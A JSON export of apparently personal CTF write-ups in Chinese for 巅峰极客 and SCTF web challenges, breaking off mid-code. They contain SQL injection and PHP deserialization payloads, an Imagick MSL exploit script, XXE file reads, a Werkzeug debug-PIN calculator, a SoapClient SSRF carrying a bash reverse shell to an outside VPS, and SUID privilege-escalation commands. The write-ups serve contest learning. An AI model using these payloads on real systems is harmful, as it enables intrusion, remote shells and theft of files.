[{"id":"cdb488d648a90943d7354784532a6374","title":"巅峰极客","content":"巅峰极客hellosql\n这个题我知道是时间延迟注入，也知道用笛卡尔积，但是我当时的方法就是测不出来\n过滤了* if 空格\n\n时间延迟我当时用的是\nSELECT A.table_name FROM information_schema.columns A, information_schema.columns B\n\nboogipop的wp\nSELECT group_concat('1') FROM information_schema.columns A, information_schema.columns B,information_schema.columns c\n\n过滤if我当时用的是,但是当时测试并不成功\nSELECT fid from file WHERE fid=10 or COALESCE(1&lt;2, 1)\n\nboogipop的wp\nid=1'or+elt(3>2,(SELECT+group_concat('1')+FROM+information_schema.columns+A,+information_schema.columns+B))+or'2\n\n\nMySQL 中的 ELT() 函数是一个字符串函数，用于根据一个给定的索引值，返回一个列表中对应索引位置的元素。该函数的语法如下，这样就会返回后面的语句:::info\n\n对于这个group_concat(‘1’)，我也看到有用sum(0)的，总之就是让它随便算一个，因为后面的表已经足够大了:::\n\n\nwp\n我在想是不是我的闭合有问题，导致我没有测试成功\nbut这个题真的很简单\n\nunserialize题目&lt;?php\nsession_start();\ninclude_once \"my.php\";\ninclude_once \"function.php\";\n\nif (!isset($_SESSION['login'])) &#123;\n\techo '&lt;script>alert(`Login First!`);location.href=`./index.php`;&lt;/script>';\n&#125;\n\n$login = @unserialize(a($_SESSION['login']));//字符减少\necho $login;\n?>\n\n\n&lt;?php\n\nclass pull_it &#123;\n\tpublic $x;\n\n\tfunction __construct($xx) &#123;\n\t\t$this->x = $xx;\n\t&#125;\n\n\tfunction __destruct() &#123;\n\t\tif ($this->x) &#123;\n\t\t\t$preg_match = 'return preg_match(\"/[A-Za-z0-9]+/i\", $this->x);';\n\t\tif (eval($preg_match)) &#123;\n\t\t\techo $preg_match;\n\t\t\texit(\"save_waf\");\n\t\t&#125;\n\t\t@eval($this->x);\n\t\t&#125;\n\t&#125;\t\n&#125;\nclass push_it &#123;\n\tprivate $root;\n\tprivate $pwd;\n\n\tfunction __construct($root, $pwd) &#123;\n\t\t$this->root = $root;\n\t\t$this->pwd = $pwd;\n\t&#125;\n\t\n\t\tfunction __destruct() &#123;\n\t\tunset($this->root);\n\t\tunset($this->pwd);\n\t&#125;\n\n\tfunction __toString() &#123;\n\t\tif (isset($this->root) &amp;&amp; isset($this->pwd)) &#123;\n\t\t\techo \"&lt;h1>Hello, $this->root&lt;/h1>\";\n\t\t&#125;\n\t\telse &#123;\n\t\t\techo \"&lt;h1>out!&lt;/h1>\";\n\t\t&#125;\n\t&#125;\n\n\n\n&#125;\n\n\n\n?>\n\n\n&lt;?php\ninclude_once \"my.php\";\ninclude_once \"function.php\";\ninclude_once \"login.html\";\nsession_start();\n\nif (isset($_POST['root']) &amp;&amp; isset($_POST['pwd'])) &#123;\n\t$root = $_POST['root'];\n\t$pwd = $_POST['pwd'];\n\t$login = new push_it($root, $pwd);\n\t\n\t$_SESSION['login'] = b(serialize($login));//过滤后字符变多\n\tdie('&lt;script>location.href=`./login.php`;&lt;/script>');\n\n&#125;\n\n\n\n?>\n\n\n&lt;?php\nfunction b($data) &#123;\n\treturn str_replace('aaaa', 'bbbbbb', $data);\n&#125;\n\nfunction a($data) &#123;\n\treturn str_replace('bbbbbb', 'aaaa', $data);\n&#125;\n\n// echo strlen(a('bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'));\n// echo strlen('\";s:3:\"pwd');\n\n?>\n\n思路\n\n类不一样咋办？\n\n\n我知道是反序列化，但是我在做题的时候，没想明白这里序列化的是push_it，但是反序列化需要用到pull_it，这怎么办？\n\n\n可以逃逸啊\n\n\n\n由于a函数是字符变少的，所以一定是字符减少的反序列化，既然普通的属性可以逃逸，那也可以逃逸pull_it这个类\n\n\n如何构造字符**b**的数量？\n\n\n\n根据我的笔记，字符减少的反序列化需要把前面的闭合，也就是我需要知道这部分的长度\n\n\n\n看到上面的属性是private，就需要格外注意，url编码后输出是**%00类%00属性**，第一行没输出是因为**%00**是不可见字符\n这里可以把它当成空格，按照空格来计算字符长度，但是传值时要编码成**%00**\n计算下面字符串的长度，因为6b ---&gt;  4a，少2个字符，现在需要空出28个字符，所以b的长度应为\n\n28 / 2 * 6 = 84\nprint_r(strlen('\";s:12:\" push_it pwd\";s:47:\"'));\n\n//长度为28\n\n\n所以给root和pwd传值\n\nroot=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n&amp;pwd=\";s:3:\"pwd\";O:7:\"pull_it\":1:&#123;s:1:\"x\";s:2:\"ls\";&#125;\n\n\n这里再传一个pwd是因为前面的pwd已经被包裹进去了，而push_it有两个属性，所以得加上。\n这里既可以只写pwd，也可以url编码后改为%00pull_it%00pwd，y4师傅的博客中说php7.1以上时对类属性不敏感，不写也可以正常输出\n\n\n\n反序列化时进行了正则匹配，需要绕过？\n\n\n\n无字母的webshell，上传数据包，用.配合通配符执行文件\n\n","slug":"巅峰极客","date":"2023-07-31T12:38:30.000Z","categories_index":"","tags_index":"Web","author_index":"XyM4ster"},{"id":"78573adfdee442ddc082a9ef8f1c1600","title":"SCTF","content":"SCTF ezcheck1n思路\nhint提示：find the way to flag.Looks like there are two containers with an evil P in the configuration file of the frontend server\n前端服务器的配置文件中有 two containers with an evil P\n\nBoogipop师傅的wpCVE-2023-25690 Apache HTTP Server 请求走私漏洞 分析与利用 - 先知社区反向代理是一种代理模式，它充当Web服务器网关的代理服务器。当您将请求发送到使用反向代理的Web服务器时，他们将先转到反向代理，由该代理将确定是将其路由到哪个内部服务器。\n\n\n将以 &#x2F;hello&#x2F; 开头的 URL 请求转发到 http://10.122.255.252/index.php 地址，并把hello之后的内容作为参数，作为name的值\n\nSCTF fumo_backdoor思路\n\nsleep函数： 如果路径存在文件，且路径不包括flag，会readfile\n\n\nDockerfile 是用于构建 Docker 镜像的文本文件，其中包含了一系列指令和参数，用于描述如何构建镜像。\nDockerfile 中的指令可以用于定义所需的基础镜像、安装依赖、添加文件、执行命令等操作，最终生成一个可运行的 Docker 镜像。\n\n\n这里注意到安装了imagick扩展，于是就上Github上搜，但是我并没有搜到\n\nhttps://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md\n\n当对象被序列化时，会触发sleep，当对象反序列化时，会触发wake up\nsleep方法会读flag，但是这里有正则匹配，所以要把flag换个目录\nwakeip方法中可以执行无参的命令\n\n问题1：如何触发sleep\n\n当前情况下，只有**session**可以序列化\n\n也就是如果我往session里写了东西，改了session，web框架检测到**session**修改，就会触发session的序列化，让他重新保存。\n当你使用 PHP 中的 session 时，如果你往 session 中写入了数据，PHP 会将这些数据序列化为字符串，并将其存储在服务器上的某个位置（通常是文件系统上的某个位置，但也可以是其他位置，例如数据库中）。当客户端请求该 session 时，PHP 会将存储的字符串反序列化为原始数据\n问题2：那怎么改session呢？\n\n参考上面的github，也就是我进到wakeup里面去，让他new Imagick(&quot;vid:msl:/tmp/php*&quot;)，现在可以执行msl脚本了\n\n\n问题3：我怎么传一个**msl**脚本？\n\n直接上传一个文件，在末尾添加脏数据，php会把上传的文件保存在/tmp/phpxxxx目录下\n用户的session保存在/tmp目录下，以sess_(这部分是用户名)\n\n\n\n 标签用于读取一个文件，它的 filename 属性指定了要读取的文件的路径和名称。在这个示例中，这个文件是一个 BASE64 编码的图片文件，它的数据被嵌入在一个 data URI 中，通过 inline: 协议来指定。\n 标签用于将处理后的图像写入到一个文件中，它的 filename 属性指定了要写入的文件的路径和名称。在这个示例中，这个文件的路径为 &#x2F;tmp&#x2F;sess_RABBIT。\n从这个 MSL 脚本来看，它的目的是读取一个图片文件，进行一些图像处理操作，然后将处理后的图片保存到/tmp/sess_afkl中\n\n问题4：现在已经跑到sleep中了，但是不能直接读flag，咋办？\n\n再执行一次new imagick，把flag换个地方\n\n\n\n这里需要让flag通过图片校验，所以去找一个检查宽松的格式\n\nhttps://github.com/ImageMagick/ImageMagick/blob/main/www/formats.html  \n\n此时我把flag读到了/tmp/2333hhhh目录下\n反序列化执行wakeup，用我的cookiePHPSESSID=afkl去读flag\n\npy脚本注意这里上传文件的格式\n\n和之前学的一样，value中包括两个元组，第一个是文件名，第二个是内容\n最后携带自己的cookiePHPSESSID去访问网站\n\ncookies=&#123;&quot;PHPSESSID&quot;: session_id&#125;)\n\nClick to see more\nimport requests, base64, time\nSERVER_ADDR = \"http://182.92.6.230:18080/\"\ndef del_tempd():\n    resp = requests.post(SERVER_ADDR, data=&#123;\"cmd\":\"rm\"&#125;)\n    print(resp.status_code)\n\ndef write_file(xml: str):\n# Imagick(\"vid:msl:/tmp/php*\")\n    unserialize = base64.b64decode(b'TzoxMzoiZnVtb19iYWNrZG9vciI6NDp7czo0OiJwYXRoIjtOO3M6NDoiYXJndiI7YToxOntpOjA7czoxNzoidmlkOm1zbDovdG1wL3BocCoiO31zOjQ6ImZ1bmMiO047czo1OiJjbGFzcyI7czo3OiJJbWFnaWNrIjt9')\n    print(unserialize)\n    resp = requests.post(SERVER_ADDR,files=&#123;\"file\":(\"exec1.msl\",xml)&#125;,data=\n    &#123;\"cmd\":\"unserialze\",\"data\":unserialize&#125;)\n    print(resp.status_code)\n    \ndef show_phpinfo() -> None:\n    print(SERVER_ADDR + \"?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A14%3A%22vid%3Amsl%3A%2Ftmp%2Fa%22%3Bs%3A4%3A%22func%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D\")\n\ndef get_new_php_session() -> str:\n    resp = requests.get(SERVER_ADDR + \"?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A14%3A%22vid%3Amsl%3A%2Ftmp%2Fa%22%3Bs%3A4%3A%22func%22%3Bs%3A13%3A%22session_start%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D\")\n    return resp.headers.get(\"Set-Cookie\")[10:42]\n\n\ndef session_start(session_id: str):\n    resp = requests.get(SERVER_ADDR + \"?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A2%3A%7Bs%3A4%3A%22path%22%3Bs%3A8%3A%22%2Ftmp%2Fyyz%22%3Bs%3A4%3A%22func%22%3Bs%3A13%3A%22session_start%22%3B%7D\", cookies=&#123;\"PHPSESSID\": session_id&#125;)\n    print(resp.text)\n\ndel_tempd()\ntime.sleep(2)\n\nsession_id = get_new_php_session()\nprint(session_id)\ntime.sleep(2)\n\ndel_tempd()\ntime.sleep(2)\n\nxml = f'''&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;group>\n&lt;image >\n &lt;read filename=\"mvg:/flag[20x20+20+20]\"!(\n!)image>\n&lt;write filename=\"mvg:/tmp/yyz\"!(\n!)group>\n'''\nxml2 = f'''&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;group>\n&lt;image >\n&lt;read\nfilename=\"inline:data:text/8BIM;base64,eXl6fE86MTM6ImZ1bW9fYmFja2Rvb3IiOjI6e3M6NDoicGF0a\nCI7czo4OiIvdG1wL3l5eiI7czo0OiJmdW5jIjtzOjEzOiJzZXNzaW9uX3N0YXJ0Ijt9\"!(\n!)image>\n&lt;write filename=\"8BIM:/tmp/sess_&#123;session_id&#125;\"!(\n!)group>\n'''\n\nwrite_file(xml)\ntime.sleep(3)\n\nwrite_file(xml2)\ntime.sleep(3)\n\nsession_start(session_id)\n\n\n\nSCTF pypyp?\n首先提示，session not started，也就是需要开启session\n\nsession.upload_progress开启session文件包含骚姿势——利用session.upload_progress进行文件包含_noViC4的博客-CSDN博客\n&lt;?php\n// 检查文件是否上传成功\nif ($_FILES['file']['error'] > 0) &#123;\n\techo '文件上传失败：' . $_FILES['file']['error'];\n\texit;\n&#125;\n\necho \"aaaa\";\n\n?>\n\n&lt;html>\n&lt;body>\n&lt;form action=\"http://192.168.1.101/a.php\" method=\"POST\" enctype=\"multipart/form-data\">\n    &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"1\" />\n    &lt;input type=\"file\" name=\"file\" />\n    &lt;input type=\"submit\" value=\"submit\" />\n&lt;/form>\n&lt;/body>\n&lt;/html>\n\n\n\n\n也就是我上传一个PHP_SESSION_UPLOAD_PROGRESS，同时带一个Cookie，就会让服务器开启session_start，创建一个session\n\n\n\n这长度竟然不一样，前面是----,后面是------\n\n\n\n会认为后面这个是post上传的数据，key是data\n在 HTTP 请求的消息体中，如果使用了 multipart&#x2F;form-data 格式，那么消息体中的每个部分都会使用 Content-Disposition 头来指定该部分的类型。如果部分是表单字段，那么 Content-Disposition 头的值通常为 form-data，并且会包含一个 name 属性来指定字段的名称。在这个例子中，Content-Disposition 头的值为 form-data; name&#x3D;”data”，其中 name&#x3D;”data” 表示这是一个名为 data 的表单字段。在 PHP 中，您可以通过访问 $_POST[‘data’] 来获取该字段的值。\n\n\nphp源码审计\nClick to see more\n&lt;?php\n    error_reporting(0);\n    if(!isset($_SESSION))&#123;\n        die('Session not started');\n    &#125;\n    highlight_file(__FILE__);\n    $type = $_SESSION['type'];\n    $properties = $_SESSION['properties'];\n    echo urlencode($_POST['data']);\n\n    extract(unserialize($_POST['data']));\n\n    if(is_string($properties)&amp;&amp;unserialize(urldecode($properties)))&#123;\n    $object = unserialize(urldecode($properties));\n    $object -> sctf();\n    exit();\n    &#125; else if(is_array($properties))&#123;\n        $object = new $type($properties[0],$properties[1]);\n    &#125; else &#123;\n        $object = file_get_contents('http://127.0.0.1:5000/'.$properties);\n    &#125;\n    echo \"this is the object: $object &lt;br>\";\n\n?>\n\n\n\n\n这里首先extract可以控制变量，$type和$properties都可以控制\n\nextract除了可以提取上传的参数，比如?properties&#x3D;aa，变成$properties&#x3D;aa\n\n也可以提取数组，array(“properties” &#x3D;&gt; “aa”,”type” &#x3D;&gt; “bb”)，这个也会变成$properties&#x3D;aa，$type&#x3D;bb\n\n$object -&gt; sctf()，但是这里显然是没有这个函数，因此可以想用soapclient进行ssrf\n\nfile_get_contents(‘http://127.0.0.1:5000/'.$properties))这个可以获取文件内容\n\n\n\n首先题目提示查看/app/app.py,那就需要想办法查看源码。\n\nnew $type($properties[0],$properties[1])，这个参数可以自己控制\nnew $type($properties[0],$properties[1])SimpleXMLElement：它可以实现xxe,xxe中用file协议读取文件，获得app.py的源码SplFileObject：支持伪协议读取文件，也就是可以用php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;app&#x2F;app.py，或者file协议读取文件\nSimpleXMLElement\n\n用php的内置类SimpleXMLElement\n\n&lt;?php\n\n$xml = &lt;&lt;&lt;EOD\n&lt;?xml version = \"1.0\"?>\n&lt;!DOCTYPE ANY [\n&lt;!ENTITY f SYSTEM \"file:///etc/passwd\">\n]>\n&lt;x>&amp;f;&lt;/x> \nEOD;\n//echo $xml;\n$arr=Array(\"properties\"=>Array($xml,2),\"type\"=>\"SimpleXMLElement\");\necho (serialize($arr));\n$obj=new SimpleXMLElement($xml,2);\n//echo $obj;\n?>\n\n\n&lt;&lt;&lt;EOD是多行字符串的意思，可以理解成python 中的&#96;&#96;&#96;&#96;&#96;\n这个2可以理解成固定的，如果输出$obj，就会运行上面的xml代码，也就是会读出etc/passwd的内容\n\n\nSplFileObject\n\n\n第一个参数可以是伪协议，第二个参数是r\n\n&lt;?php\n\n//echo $xml;\n$x = \"php://filter/read=convert.base64-encode/resource=/app/app.py\";\n$arr=Array(\"properties\"=>Array($x,'r'),\"type\"=>\"SplFileObject\");\necho (serialize($arr));\n#\n\n\n\n解码后得到源码\n\nfrom flask import Flask\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return 'Hello World!'\n\nif __name__ == '__main__':\n    app.run(host=\"0.0.0.0\",debug=True)\n\n\nflask开启了debug–&gt;pin码rce\n正常在本地运行一下环境，之后访问/console，输入正确的Pin码后，可以进入console，执行命令\n那如果我可以控制服务器的console，也就可以rce了\n首先用file_get_contents访问一下console\n\n\n\n本地测试\n\n\n发现访问时候的参数如下，因为我没法输入命令(都是在burp render看的回显)，所以我只能带着参数去访问\n\n\n\n发现是有cookie的\n\n那如何带着参数去访问呢？\n\n那就只能用**SoapClient**，因为上面有一个object-&gt;sctf，也就是会调用soapclient的call方法，也就是可以携带参数访问了\n\n\nflask算pin码\n\n\n网上有很多教程，首先我需要确定的是python的版本\n因为它没有报错，所以我不知道路径，只能看运气\n用GlobIterrator类配合glob伪协议去找每个可能一点的目录\nV&amp;N的wp中说用php的GlobIterrator类配合glob伪协议去找每个可能一点的目录，这个目前我还没实现\n我本地的目录是，算pin码的方法在__init__.py中\n\n\n\n这里就百度找吧，因为前一天我做了一个ctfshow的flask算pin码的，大致差不多\n也有的wp说访问/usr/lib/python3.8/LICENSE.txt，如果它存在，说明是python3.8\n最后__init__.py的位置在\n\n/usr/lib/python3.8/site-packages/werkzeug/debug/init.py\n算pin码的脚本\n\n直接翻源码\n\n\nClick to see more\nimport getpass\nimport hashlib\nimport json\nimport mimetypes\nimport os\nimport pkgutil\nimport re\nimport sys\nimport time\nimport typing as t\nimport uuid\nfrom itertools import chain\nfrom os.path import basename\nfrom os.path import join\ndef hash_pin(pin: str) -> str:\n    return hashlib.sha1(f\"&#123;pin&#125; added salt\".encode(\"utf-8\", \"replace\")).hexdigest()[:12]\ndef get_pin_and_cookie_name() :\n \n    rv = None\n    num = None\n    probably_public_bits = [\n        'app',\n        'flask.app',\n        'Flask',\n        '/usr/lib/python3.8/site-packages/flask/app.py'\n    ]\n\n    private_bits = [\n        '2485378023426', #  /sys/class/net/eth0/address 16进制转10进制\n        #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup\n        '349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687'\n    ]\n\n\n    h = hashlib.sha1()\n    for bit in chain(probably_public_bits, private_bits):#使用 chain 函数可以方便地将多个可迭代对象合并成一个迭代器\n        if not bit:                                        #遍历其中的所有元素\n            continue\n        if isinstance(bit, str):#判断它是否为字符串类型\n            bit = bit.encode(\"utf-8\")\n        h.update(bit)\n    h.update(b\"cookiesalt\")\n\n    cookie_name = f\"__wzd&#123;h.hexdigest()[:20]&#125;\"\n\n    # If we need to generate a pin we salt it a bit more so that we don't\n    # end up with the same value and generate out 9 digits\n    if num is None:\n        h.update(b\"pinsalt\")\n        num = f\"&#123;int(h.hexdigest(), 16):09d&#125;\"[:9]\n\n    # Format the pincode in groups of digits for easier remembering if\n    # we don't have a result yet.\n    if rv is None:\n        for group_size in 5, 4, 3:\n            if len(num) % group_size == 0:\n                rv = \"-\".join(\n                    num[x : x + group_size].rjust(group_size, \"0\")\n                    for x in range(0, len(num), group_size)\n                )\n                break\n        else:\n            rv = num\n\n    cookie_value = f\"&#123;int(time.time())&#125;|&#123;hash_pin(rv)&#125;\",\n    print(cookie_value)\nget_pin_and_cookie_name() \n\n\n\n\n\n最后这个路径是/usr/lib/python3.8/site-packages/flask/app.py，我在本地输出的是下面这个，也就是找到前半部分，后面直接对应就行了\n\n\n\n通过xxe查看信息\n\n\n\n查看 /sys/class/net/eth0/address，用下面的代码转成10进制\n\n\nint('0242ac130002',16)#2485378023426\n\n\n下面是获取machine_id的源码，通常\n\n\n\ndocker没有第一个，只需要把后两个合起来就行了\n\nproc/sys/kernel/random/boot_id /proc/self/cgroup\n\n根据上面的代码，用/分开，且要最后一部分\n\n\n\n最后计算pin的脚本，cookie_value的算法参见__int__.py源码\n\n\nClick to see more\ndef hash_pin(pin: str) -> str:\n    return hashlib.sha1(f\"&#123;pin&#125; added salt\".encode(\"utf-8\", \"replace\")).hexdigest()[:12]\ndef get_pin_and_cookie_name() :\n \n    rv = None\n    num = None\n    probably_public_bits = [\n        'app',\n        'flask.app',\n        'Flask',\n        '/usr/lib/python3.8/site-packages/flask/app.py'\n    ]\n\n    private_bits = [\n        '2485378023426', #  /sys/class/net/eth0/address 16进制转10进制\n        #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup\n        '349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687'\n    ]\n\n\n    h = hashlib.sha1()\n    for bit in chain(probably_public_bits, private_bits):#使用 chain 函数可以方便地将多个可迭代对象合并成一个迭代器\n        if not bit:                                        #遍历其中的所有元素\n            continue\n        if isinstance(bit, str):#判断它是否为字符串类型\n            bit = bit.encode(\"utf-8\")\n        h.update(bit)\n    h.update(b\"cookiesalt\")\n\n    cookie_name = f\"__wzd&#123;h.hexdigest()[:20]&#125;\"\n\n    # If we need to generate a pin we salt it a bit more so that we don't\n    # end up with the same value and generate out 9 digits\n    if num is None:\n        h.update(b\"pinsalt\")\n        num = f\"&#123;int(h.hexdigest(), 16):09d&#125;\"[:9]\n\n    # Format the pincode in groups of digits for easier remembering if\n    # we don't have a result yet.\n    if rv is None:\n        for group_size in 5, 4, 3:\n            if len(num) % group_size == 0:\n                rv = \"-\".join(\n                    num[x : x + group_size].rjust(group_size, \"0\")\n                    for x in range(0, len(num), group_size)\n                )\n                break\n        else:\n            rv = num\n\n    cookie_value = f\"&#123;int(time.time())&#125;|&#123;hash_pin(rv)&#125;\",\n    print(cookie_value)\nget_pin_and_cookie_name() \n\n\n\nsoapclient发包，反弹shell\n这里注意cmd中的参数要url编码，否则会有问题\nvps上开 nc -lvnp 7777,这里如果没有参数n，也会有问题\n\n$target = 'http://127.0.0.1:5000/console?&amp;__debugger__=yes&amp;cmd=__import__(%22os%22).popen(%22bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F124.222.155.242%2F7777%20%3C%262%5C%22%22)&amp;frm=0&amp;s=DhOJxtvMXCtezvKtqaK9';\n$ua =\"xym4ster\\r\\nX-Forwarded-For: 127.0.0.1\\r\\nCookie: __wzdb2a60e2b19822632a67c=1688531875|11b8517fb9fb\";\n$b = new SoapClient(null,array(\n    'location' => $target,\n    'user_agent'=>$ua,\n    'uri'=> \"aaab\"));\n$arr=Array(\"properties\"=>urlencode(serialize($b)),\"type\"=>\"SimpleXMLElement\");\n$aaa = serialize($arr);\necho $aaa;\n\n\n\n\n反弹成功，但是查看flag，发现没有权限，需要提权\n\n\n关于反弹shell\n\n上面的命令是\n\nbash -c \\\"bash -i >&amp; /dev/tcp/124.222.155.242/7777 &lt;&amp;2\\\"\n\n\n-c 选项表示将后面的参数作为一个命令来执行\n-i相当于会启动一个交互式的bash shell\n所以要先bash -c 再bash -i\n\n命令的含义Linux 反弹shell（二）反弹shell的本质 - 先知社区\n\n\n\n\n\n\n\n\n\n\n&amp;表示把标准输出和标准错误输出 都输出到vps上，也就是1和2 都指向vps\n\n后面的 &lt;&amp;2 相当于 0&lt;&amp;2，表示把标准输入指针到标准错误输出，也就是0也指向2，0指向1也行\n\n\n\n\n\n首先\n\nsuid 提权 curl权限提升 | suid提权及修复方式-腾讯云开发者社区-腾讯云\n通常Linux系统文件及目录最常见的三种权限为：可读权限(r)，可写权限(w)和可执行权限(x)。有时我们会发现有些文件或者目录的所属主的权限会带s标识。当s这个标志出现在文件所有者的x权限上时，如&#x2F;usr&#x2F;bin&#x2F;passwd文件的权限状态：“-rwsr-xr-x.”，此时就被称为Set UID，简称为SUID权限。当一个可执行文件被设置了 s 权限时，在执行该程序时，它将会以该程序的所有者或所属组的身份运行。\n\n也就是如果我找到了一个有SUID权限且属主为root的，我就能用root的权限执行\n\nfind / -user root -perm -4000 -print 2>/dev/null\nfind / -perm -u=s -type f 2>/dev/null\nfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;\n\n-perm 表示搜索随后的权限\n-u=s 表示查找root用户拥有的文件\n-type表示我们正在寻找的文件类型\nf 表示常规文件，而不是目录或特殊文件\n2 表示该进程的第二个文件描述符，即stderr（标准错误）\n> 表示重定向\n/dev/null 是一个特殊的文件系统对象，它将丢弃写入其中的所有内容\n\n\n\n发现有curl，直接curl file:///flag\n\n\nSCTF hellojavajava8、java11环境配置JDK 8 和JDK11双环境配置_别卷了球球了的博客-CSDN博客\n\n先安装jdk11，再安装jdk8(但是我觉得这个顺序不重要，只要把下面的文件删了就行)\n\n\n\n要把这个文件夹里面存在的文件都删掉(java.exe)啥的，不让cmd打开的优先级比我自己设置的优先级高\n配置环境变量\n\n\n\n把D:\\jdk-11\\bin目录下的java.exe改成java11.exe\n此时输入java -version，系统默认是jdk1.8，输入java11 -version是java11\n\n\njar包反编译\n给个jar包，用idea的插件java decompiler反编译\n在jar包所在的文件夹，打开cmd\n\njava -cp \"D:\\idea\\IntelliJ IDEA 2021.1.3\\plugins\\java-decompiler\\lib\\java-decompiler.jar\" org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true sctf.jar test\n\n\n中间双引号的是插件路径(换成自己的)，true后面第一个参数是jar包的名字,第二个参数是反编译后文件存放的位置，这里要新建一个test文件夹\n反编译成功之后，还是一个jar包，用jar命令解压\n\njar -xvf sctf.jar\n\n\n\n函数的作用是循环处理键\n\n整个代码的含义\nClick to see more\nprotected Object _deserializeUsingPropertyBased(final JsonParser p, final DeserializationContext ctxt)\n       throws IOException\n   &#123;\n       final PropertyBasedCreator creator = _propertyBasedCreator;\n    //这里获取标注@JsonCreator的构造函数\n       PropertyValueBuffer buffer = creator.startBuilding(p, ctxt, _objectIdReader);\n       TokenBuffer unknown = null;\n       final Class&lt;?> activeView = _needViewProcesing ? ctxt.getActiveView() : null;\n\n       JsonToken t = p.currentToken();\n    //currentToken() 方法的作用是返回当前解析器所读取的 JSON 标记\n       List&lt;BeanReferring> referrings = null;\n       for (; t == JsonToken.FIELD_NAME; t = p.nextToken()) &#123;\n           String propName = p.currentName();\n           p.nextToken(); // to point to value\n           final SettableBeanProperty creatorProp = creator.findCreatorProperty(propName);\n           /* \n           反序列化 JSON 字符串时，\n           Jackson 会使用 SettableBeanProperty 对象来访问和设置 Java 对象的属性\n           这行代码用于查找 PropertyBasedCreator 对象中是否存在与当前 JSON 字段名字 propName \n           匹配的 SettableBeanProperty 属性\n           也就是找类中有没有映射的属性\n           */\n           if (buffer.readIdProperty(propName) &amp;&amp; creatorProp == null) &#123;\n               continue;\n           &#125;\n           // creator property?\n           if (creatorProp != null) &#123;\n               // Last creator property to set?\n               Object value;\n               if ((activeView != null) &amp;&amp; !creatorProp.visibleInView(activeView)) &#123;\n                   p.skipChildren();\n                   continue;\n               &#125;\n               value = _deserializeWithErrorWrapping(p, ctxt, creatorProp);\n               //对属性值反序列化\n               if (buffer.assignParameter(creatorProp, value)) &#123;\n                   p.nextToken(); // to move to following FIELD_NAME/END_OBJECT\n                   Object bean;\n                   try &#123;\n                       bean = creator.build(ctxt, buffer);\n                   &#125; catch (Exception e) &#123;\n                       bean = wrapInstantiationProblem(e, ctxt);\n                   &#125;\n                   if (bean == null) &#123;\n                       return ctxt.handleInstantiationProblem(handledType(), null,\n                               _creatorReturnedNullException());\n                   &#125;\n                   // [databind#631]: Assign current value, to be accessible by custom serializers\n                   p.setCurrentValue(bean);\n\n                   //  polymorphic?\n                   if (bean.getClass() != _beanType.getRawClass()) &#123;\n                       return handlePolymorphic(p, ctxt, bean, unknown);\n                   &#125;\n                   if (unknown != null) &#123; // nope, just extra unknown stuff...\n                       bean = handleUnknownProperties(ctxt, bean, unknown);\n                   &#125;\n                   // or just clean?\n                   return deserialize(p, ctxt, bean);\n               &#125;\n               continue;\n           &#125;\n           // regular property? needs buffering\n           SettableBeanProperty prop = _beanProperties.find(propName);\n           if (prop != null) &#123;\n               try &#123;\n                   buffer.bufferProperty(prop, _deserializeWithErrorWrapping(p, ctxt, prop));\n               &#125; catch (UnresolvedForwardReference reference) &#123;\n                   // 14-Jun-2016, tatu: As per [databind#1261], looks like we need additional\n                   //    handling of forward references here. Not exactly sure why existing\n                   //    facilities did not cover, but this does appear to solve the problem\n                   BeanReferring referring = handleUnresolvedReference(ctxt,\n                           prop, buffer, reference);\n                   if (referrings == null) &#123;\n                       referrings = new ArrayList&lt;BeanReferring>();\n                   &#125;\n                   referrings.add(referring);\n               &#125;\n               continue;\n           &#125;\n           // Things marked as ignorable should not be passed to any setter\n           if (IgnorePropertiesUtil.shouldIgnore(propName, _ignorableProps, _includableProps)) &#123;\n               handleIgnoredProperty(p, ctxt, handledType(), propName);\n               continue;\n           &#125;\n           // \"any property\"?\n           if (_anySetter != null) &#123;\n               try &#123;\n                   buffer.bufferAnyProperty(_anySetter, propName, _anySetter.deserialize(p, ctxt));\n               &#125; catch (Exception e) &#123;\n                   wrapAndThrow(e, _beanType.getRawClass(), propName, ctxt);\n               &#125;\n               continue;\n           &#125;\n\n           // 29-Mar-2021, tatu: [databind#3082] May skip collection if we know\n           //    they'd just get ignored (note: any-setter handled above; unwrapped\n           //    properties also separately handled)\n           if (_ignoreAllUnknown) &#123;\n               // 22-Aug-2021, tatu: [databind#3252] must ensure we do skip the whole value\n               p.skipChildren();\n               continue;\n           &#125;\n           // Ok then, let's collect the whole field; name and value\n           if (unknown == null) &#123;\n               unknown = ctxt.bufferForInputBuffering(p);\n           &#125;\n           unknown.writeFieldName(propName);\n           unknown.copyCurrentStructure(p);\n       &#125;\n\n       // We hit 